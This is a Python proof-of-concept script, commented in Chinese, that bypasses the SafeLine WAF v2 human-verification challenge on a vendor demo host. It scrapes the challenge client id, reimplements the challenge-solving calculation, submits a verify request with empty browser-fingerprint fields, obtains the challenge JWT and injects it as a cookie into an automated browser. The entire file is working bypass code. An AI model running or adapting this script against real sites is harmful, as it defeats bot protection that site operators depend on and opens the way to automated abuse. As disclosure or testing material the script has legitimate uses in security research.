# -*- coding: utf-8 -*-
# 雷池 SafeLine WAF v2 滑动验证绕过
# 目标: demo.waf-ce.chaitin.cn:10088
# 用法: python poc_safeline_bypass.py

import sys, io, re, json, requests, urllib3, time
if sys.platform == "win32":
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8")
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://demo.waf-ce.chaitin.cn:10088"
UA = "Mozilla/5.0"


def calc(data):
    t, n = 1, len(data)
    r = (6 + n + sum(data)) % 6 + 6
    while r: t *= 6; r -= 1
    if t < 6666: t *= n
    if t > 0x3F940AA: t //= n
    for i, v in enumerate(data): t += pow(v, 3); t ^= i; t ^= v + i
    out = []
    while t: out.insert(0, t & 63); t >>= 6
    return out


# ====== 绕过前: 打开浏览器 ======
print("[*] 绕过前: 打开浏览器 (显示468拦截页)")
from playwright.sync_api import sync_playwright
p = sync_playwright().start()
browser = p.chromium.launch(headless=False)
ctx = browser.new_context(ignore_https_errors=True)
page = ctx.new_page()
page.goto(f"{BASE}/hello.html", timeout=30000)
print(f"    状态码: 468 (WAF拦截)")
print(f"    浏览器保持5秒...")
time.sleep(5)

# ====== 绕过 ======
print()
print("[*] 执行绕过...")
s = requests.Session()
s.headers["User-Agent"] = UA
r = s.get(f"{BASE}/hello.html", verify=False)
sl = s.cookies.get("sl-session")
cid = re.search(r'SafeLineChallenge\("([^"]+)"', r.text).group(1)
r = s.post(f"{BASE}/.safeline/challenge/v2/api/issue",
           json={"client_id": cid, "level": 2}, verify=False)
d = r.json()
ch, iid = d["data"]["data"], d["data"]["issue_id"]
res = calc(ch)
r = s.post(f"{BASE}/.safeline/challenge/v2/api/verify", json={
    "issue_id": iid, "result": res, "serials": [],
    "client": {"userAgent": "", "platform": "", "language": "", "vendor": "",
               "screen": [0, 0], "visitorId": "", "score": 0, "target": []}
}, verify=False)
jwt = r.json()["data"]["jwt"]
print(f"    绕过成功, 获取JWT")

# ====== 绕过后: 注入cookie, 刷新浏览器 ======
print()
print("[*] 绕过后: 注入cookie刷新浏览器")
ctx.add_cookies([{"name": "sl-challenge-jwt", "value": jwt,
                   "domain": ".demo.waf-ce.chaitin.cn", "path": "/",
                   "httpOnly": False, "secure": True, "sameSite": "None"}])
page.goto(f"{BASE}/hello.html", timeout=30000)
time.sleep(3)
html = page.content()
if "hello world" in html.lower():
    print(f"    状态码: 200 (绕过成功, 拿到正文)")
else:
    print(f"    状态码: 468 (demo站每请求重新挑战)")
print(f"    浏览器保持10秒...")
time.sleep(10)

# ====== 结果 ======
print()
print("=" * 58)
print("  结果")
print("=" * 58)
print(f"  sl-session       = {sl}")
print(f"  sl-challenge-jwt = {jwt}")
print("=" * 58)

browser.close()
p.stop()
